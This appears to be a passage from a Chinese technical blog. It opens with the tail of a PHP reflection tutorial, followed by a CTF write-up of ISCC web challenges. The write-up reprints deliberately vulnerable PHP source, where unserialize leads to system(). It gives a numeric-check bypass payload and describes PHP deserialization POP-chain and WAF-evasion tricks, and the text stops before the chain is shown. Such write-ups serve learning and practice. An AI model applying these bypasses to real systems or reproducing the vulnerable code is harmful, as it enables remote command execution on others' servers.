&#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;setName(&#96;&#96;$v&#96;&#96;)&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$this&#96;&#96;-&gt;name &#x3D; &#96;&#96;$v&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;getBiography()&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;return&#96; &#96;$this&#96;&#96;-&gt;biography;&#96;&#96;  &#96;&#96;&#125;&#96; &#96;  &#96;&#96;public&#96; &#96;function&#96; &#96;setBiography(&#96;&#96;$v&#96;&#96;)&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$this&#96;&#96;-&gt;biography &#x3D; &#96;&#96;$v&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96;&#96;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>一、通过ReflectionClass，我们可以得到Person类的以下信息：</strong></p>
<ol>
<li>常量 Contants</li>
<li>属性 Property Names</li>
<li>方法 Method Names静态</li>
<li>属性 Static Properties</li>
<li>命名空间 Namespace</li>
<li>Person类是否为final或者abstract</li>
<li>Person类是否有某个方法</li>
</ol>
<p>接下来反射它，只要把类名”Person”传递给ReflectionClass就可以了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$class&#96; &#96;&#x3D; &#96;&#96;new&#96; &#96;ReflectionClass(&#96;&#96;&#39;Person&#39;&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 建立 Person这个类的反射类 &#96;&#96;$instance&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;newInstanceArgs(&#96;&#96;$args&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 相当于实例化Person 类</span><br></pre></td></tr></table></figure>



<p><strong>1）获取属性(Properties)：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;$properties&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getProperties();&#96;&#96;foreach&#96; &#96;(&#96;&#96;$properties&#96; &#96;as&#96; &#96;$property&#96;&#96;)&#96;&#96;&#123;&#96;&#96;  &#96;&#96;echo&#96; &#96;$property&#96;&#96;-&gt;getName() . &#96;&#96;&quot;\n&quot;&#96;&#96;;&#96;&#96;&#125;&#96;&#96;&#x2F;&#x2F; 输出:&#96;&#96;&#x2F;&#x2F; _allowDynamicAttributes&#96;&#96;&#x2F;&#x2F; id&#96;&#96;&#x2F;&#x2F; name&#96;&#96;&#x2F;&#x2F; biography</span><br></pre></td></tr></table></figure>

<p>默认情况下，ReflectionClass会获取到所有的属性，private 和 protected的也可以。如果只想获取到private属性，就要额外传个参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$private_properties&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getProperties(ReflectionProperty::IS_PRIVATE);</span><br></pre></td></tr></table></figure>

<p>可用参数列表：</p>
<ul>
<li>ReflectionProperty::IS_STATIC</li>
<li>ReflectionProperty::IS_PUBLIC</li>
<li>ReflectionProperty::IS_PROTECTED</li>
<li>ReflectionProperty::IS_PRIVATE</li>
</ul>
<p>通过$property-&gt;getName()可以得到属性名。</p>
<p><strong>2）获取注释：</strong></p>
<p>通过getDocComment可以得到写给property的注释。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;foreach&#96; &#96;(&#96;&#96;$properties&#96; &#96;as&#96; &#96;$property&#96;&#96;)&#96;&#96;&#123;&#96;&#96;  &#96;&#96;if&#96; &#96;(&#96;&#96;$property&#96;&#96;-&gt;isProtected())&#96;&#96;  &#96;&#96;&#123;&#96;&#96;    &#96;&#96;$docblock&#96; &#96;&#x3D; &#96;&#96;$property&#96;&#96;-&gt;getDocComment();&#96;&#96;    &#96;&#96;preg_match(&#96;&#96;&#39;&#x2F; type\&#x3D;([a-z_]*) &#x2F;&#39;&#96;&#96;, &#96;&#96;$property&#96;&#96;-&gt;getDocComment(), &#96;&#96;$matches&#96;&#96;);&#96;&#96;    &#96;&#96;echo&#96; &#96;$matches&#96;&#96;[1] . &#96;&#96;&quot;\n&quot;&#96;&#96;;&#96;&#96;  &#96;&#96;&#125;&#96;&#96;&#125;&#96;&#96;&#x2F;&#x2F; Output:&#96;&#96;&#x2F;&#x2F; primary_autoincrement&#96;&#96;&#x2F;&#x2F; varchar&#96;&#96;&#x2F;&#x2F; text</span><br></pre></td></tr></table></figure>



<p><strong>3）获取类的方法</strong></p>
<ul>
<li>getMethods()    来获取到类的所有methods。</li>
<li>hasMethod(string)  是否存在某个方法</li>
<li>getMethod(string)  获取方法</li>
</ul>
<p><strong>4）执行类的方法：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$instance&#96;&#96;-&gt;getName(); &#96;&#96;&#x2F;&#x2F; 执行Person 里的方法getName&#96;&#96;&#x2F;&#x2F; 或者：&#96;&#96;$method&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getmethod(&#96;&#96;&#39;getName&#39;&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 获取Person 类中的getName方法&#96;&#96;$method&#96;&#96;-&gt;invoke(&#96;&#96;$instance&#96;&#96;);       &#96;&#96;&#x2F;&#x2F; 执行getName 方法&#96;&#96;&#x2F;&#x2F; 或者：&#96;&#96;$method&#96; &#96;&#x3D; &#96;&#96;$class&#96;&#96;-&gt;getmethod(&#96;&#96;&#39;setName&#39;&#96;&#96;); &#96;&#96;&#x2F;&#x2F; 获取Person 类中的setName方法&#96;&#96;$method&#96;&#96;-&gt;invokeArgs(&#96;&#96;$instance&#96;&#96;, &#96;&#96;array&#96;&#96;(&#96;&#96;&#39;snsgou.com&#39;&#96;&#96;));</span><br></pre></td></tr></table></figure>



<p><strong>二、通过ReflectionMethod，我们可以得到Person类的某个方法的信息：</strong></p>
<ol>
<li>是否“public”、“protected”、“private” 、“static”类型</li>
<li>方法的参数列表</li>
<li>方法的参数个数</li>
<li>反调用类的方法</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php&#96;&#96;&#x2F;&#x2F; 执行detail方法 $method&#96;&#x3D; new ReflectionMethod(&#39;Person&#39;, &#39;test&#39;);&#96;&#96;if&#96; &#96;(&#96;&#96;$method&#96;&#96;-&gt;isPublic() &amp;&amp; !$method-&gt;isStatic())&#96;&#96;&#123;&#96;&#96;  &#96;&#96;echo&#96; &#96;&#39;Action is right&#39;&#96;&#96;;&#96;&#96;&#125;&#96;&#96;echo&#96; &#96;$method&#96;&#96;-&gt;getNumberOfParameters(); &#96;&#96;&#x2F;&#x2F; 参数个数&#96;&#96;echo&#96; &#96;$method&#96;&#96;-&gt;getParameters(); &#96;&#96;&#x2F;&#x2F; 参数对象数组</span><br></pre></td></tr></table></figure>



</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/09/%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/">逆向入门（一）</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-09</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/02/ISCCweb%E9%A2%98%E8%A7%A3/">ISCCweb题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-02</time><div class="content"><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>web的题大都做过类似的了，所以比较简单。。但是没想到难的题目都在杂项，开始后悔寒假没多学点杂项了。。。</p>
<h2 id="web1——ISCC客服冲冲冲（一）"><a href="#web1——ISCC客服冲冲冲（一）" class="headerlink" title="web1——ISCC客服冲冲冲（一）"></a>web1——ISCC客服冲冲冲（一）</h2><p>F12审查元素，将对面那个客服的voting给删掉，然后它的票就不会增加了，</p>
<h2 id="web2——这是啥"><a href="#web2——这是啥" class="headerlink" title="web2——这是啥"></a>web2——这是啥</h2><p>jsfuck代码，直接F12运行一下就能拿到FLAG</p>
<h2 id="web3——正则匹配"><a href="#web3——正则匹配" class="headerlink" title="web3——正则匹配"></a>web3——正则匹配</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&lt;p&gt;code.txt&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">     </span><br><span class="line">	<span class="keyword">if</span> (preg_match (<span class="string">&quot;/^[a-zA-Z0-9]+$/&quot;</span>, $_GET[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">	&#123;    </span><br><span class="line">    </span><br><span class="line">		<span class="keyword">if</span> (strpos ($_GET[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;*-*&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . $flag);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码如上，首先要字母和数字，然后有个位数限制，并且要数值需要大于9999999，采用科学技术法进行绕过<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6e8*-*</span><br></pre></td></tr></table></figure>

<h2 id="web4——登录"><a href="#web4——登录" class="headerlink" title="web4——登录"></a>web4——登录</h2><p>反序列化字符串逃逸就不说了</p>
<h2 id="web5——which-is-the-true-iscc"><a href="#web5——which-is-the-true-iscc" class="headerlink" title="web5——which is the true iscc"></a>web5——which is the true iscc</h2><p>查看源码:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210503104045.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">$status = <span class="string">&quot;new&quot;</span>;</span><br><span class="line">$cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$is_unser_finished = <span class="literal">false</span>;</span><br><span class="line">$iscc_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = (count($_FILES) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $iscc_file;</span><br><span class="line">        $status = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ($is_upload) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">                $GLOBALS[$key] = $value;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(is_uploaded_file($iscc_file[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">                </span><br><span class="line">                $check = @getimagesize($iscc_file[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    $target_dir = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    $target_file = $target_dir . randstr(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;想啥呢？有东西了……&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ($iscc_file[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;东西塞不进去~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file($iscc_file[<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;我拿到了！&lt;br&gt;&quot;</span>;</span><br><span class="line">                        $iscc_file = $target_file;</span><br><span class="line">                        $status = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;拿不到:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    finalize();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你真是个天才!&lt;br&gt;&quot;</span>;</span><br><span class="line">                finalize();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $new_cmd = <span class="string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&quot;你这罐子是空的!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);   </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_string(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&#x27;东西都没给对!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $status = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>] === <span class="string">&#x27;isccIsCciScc1scc&#x27;</span>) &#123;</span><br><span class="line">            $cmd = <span class="keyword">$this</span>-&gt;new_cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Login</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $flag = file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        $pAssM0rd = hash(<span class="string">&quot;sha256&quot;</span>, $flag);</span><br><span class="line">        <span class="keyword">if</span>($_GET[<span class="string">&#x27;pAssM0rd&#x27;</span>] === $pAssM0rd)</span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;isccIsCciScc1scc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_TellMeTruth</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>])) </span><br><span class="line">            $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;似乎这个 &quot;</span>.$_SESSION[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot; 是真相&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Command</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;看看你干的好事: <span class="subst">&#123;$cmd&#125;</span> &lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $is_unser_finished;</span><br><span class="line">        $status = <span class="string">&quot;cmd&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($is_unser_finished === <span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;看看你干的 [&lt;span style=&#x27;color:red&#x27;&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/span&gt;] 弄出了什么后果: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;span style=&#x27;color:blue&#x27;&gt;&quot;</span>;</span><br><span class="line">            @system($cmd);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/span&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">randstr</span>(<span class="params">$len</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $characters = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_=&#x27;</span>;</span><br><span class="line">    $randstring = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $randstring .= $characters[rand(<span class="number">0</span>, strlen($characters))];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $randstring;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos($s, <span class="string">&quot;*&quot;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finalize</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    $is_upload = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">    @unlink($iscc_file);</span><br><span class="line">    $status = <span class="string">&quot;finish&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;whichisthetrueiscc.gif&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>])) &#123;</span><br><span class="line">    $whatareyounongshane = $_GET[<span class="string">&#x27;whatareyounongshane&#x27;</span>];</span><br><span class="line">    <span class="keyword">switch</span> ($whatareyounongshane) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;src&quot;</span>:</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;想越级干好事？还是有门的……&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:12:&quot;ISCC_Command&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;reset&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;几辈子积累的好运就在这时~:p&quot;</span>;</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:13:&quot;ISCC_ResetCMD&quot;:1:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;upload&quot;</span>:</span><br><span class="line">            $resp = &lt;&lt;&lt;EOF</span><br><span class="line">&lt;form action=<span class="string">&quot;/index.php?%3f=O:11:%22ISCC_Upload%22:0:&#123;&#125;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;iscc_file&quot;</span>&gt;</span><br><span class="line">  &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Upload Image&quot;</span> name=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">EOF;</span><br><span class="line">            <span class="keyword">echo</span> $resp;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;tellmetruth&quot;</span>:</span><br><span class="line">            <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PGltZyBzcmM9J3RlbGxtZXRydXRoLmdpZic+Cg==&quot;</span>);</span><br><span class="line">            header(<span class="string">&#x27;Location: /?%3f=O:14:&quot;ISCC_TellMeTruth&quot;:0:&#123;&#125;&#x27;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;空空如也就是我！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;?&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">    $wtf = waf($_GET&#123;<span class="string">&#x27;?&#x27;</span>&#125;) ? $_GET[<span class="string">&#x27;?&#x27;</span>] : (finalize() &amp;&amp; <span class="keyword">die</span>(<span class="string">&quot;试试就“逝世”!&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>($goodshit = @unserialize($wtf)) &#123;</span><br><span class="line">        $is_unser_finished = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(in_array($status, <span class="keyword">array</span>(<span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        finalize();</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;所以哪个ISCC是真的？&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>忘记保存了，重新复述一下吧审计完以后，可以知道我们的目的是执行system指令——》需要更改session[name]的值——》需要upload里面变量覆盖</p>
<p><strong>难点:</strong><br>1.每个类的wakeup函数都重新定义了session[name]，调用每个类的时候，肯定会使用到wakeup，如果当我们的session[name]刚被赋值完iscc…..就被赋值回去了，那就没用了，所以我们需要进行绕过<br>2.由于里面有protect变量，所以也需要绕过waf的过滤<br><strong>解决方案:</strong><br>1.wakeup的调用顺序是由内向外的，destruct的调用是由外向内的,所以我们以类似的嵌套方式（类似）来调用赋值，利用一个中间变量进行中转，这样及时最后用了wake_up函数也没事，因为我们已经执行完了<br>2.可以利用大写S来绕过对protected,private等属性的字符检测，也就是将序列化过程中小写s改为大写s，这样后面的内容我们就可以用十六进制进行表示了</p>
<p>POP链构造:</p>
